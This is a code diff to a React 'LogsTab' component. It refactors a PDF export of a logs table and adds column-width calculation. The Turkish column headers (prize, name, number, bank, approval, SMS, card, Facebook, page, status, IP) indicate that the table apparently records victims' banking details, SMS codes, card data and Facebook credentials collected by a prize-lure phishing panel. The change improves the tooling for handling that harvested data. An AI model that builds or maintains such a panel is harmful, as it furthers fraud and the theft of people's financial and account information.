@@ -1395,9 +1395,10 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       };
 
       const s = (v: unknown) => (v == null ? "" : String(v));
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "Sayfa", "Durum", "IP"];
 
       const tableBody: any[][] = [
-        ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "Sayfa", "Durum", "IP"].map(
+        COL_HEADERS.map(
           (h) => ({ text: h, bold: true, color: "#ffffff", fillColor: "#111827", fontSize: 7.5 })
         ),
       ];
@@ -1463,6 +1464,31 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         (pdfFontsModule as any).vfs;
 
       const dateStr = new Date().toISOString().slice(0, 10);
+
+      // Kolon genisligi = icerigin en uzun satirina gore orantisal dagitim
+      const cellMaxLen = (cell: any): number => {
+        if (cell == null) return 0;
+        const items: any[] = Array.isArray(cell) ? cell : cell.stack ? cell.stack : [cell];
+        let m = 0;
+        for (const it of items) {
+          const t = typeof it === "object" && it !== null ? s(it.text) : s(it);
+          if (t.length > m) m = t.length;
+        }
+        return m;
+      };
+      const colMax = COL_HEADERS.map((h) => h.length);
+      for (const row of tableBody.slice(1)) {
+        row.forEach((cell: any, i: number) => {
+          const l = cellMaxLen(cell);
+          if (l > colMax[i]) colMax[i] = l;
+        });
+      }
+      // char basina ~3.6pt @7pt font; min 28pt, uzun kolonlar 170pt'de kirilir (wrap)
+      const desired = colMax.map((l) => Math.min(Math.max(l * 3.6 + 8, 28), 170));
+      const usable = 802; // A4 landscape - margins
+      const scale = desired.reduce((a, b) => a + b, 0) > usable ? usable / desired.reduce((a, b) => a + b, 0) : 1;
+      const widths = desired.map((w) => Math.max(w * scale, 20));
+
       const doc: any = {
         pageSize: "A4",
         pageOrientation: "landscape",
@@ -1485,7 +1511,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           {
             table: {
               headerRows: 1,
-              widths: ["auto", "auto", "auto", "*", "auto", "*", "*", "auto", "*", "*", "auto", "auto", "auto"],
+              widths,
               body: tableBody,
             },
             layout: {
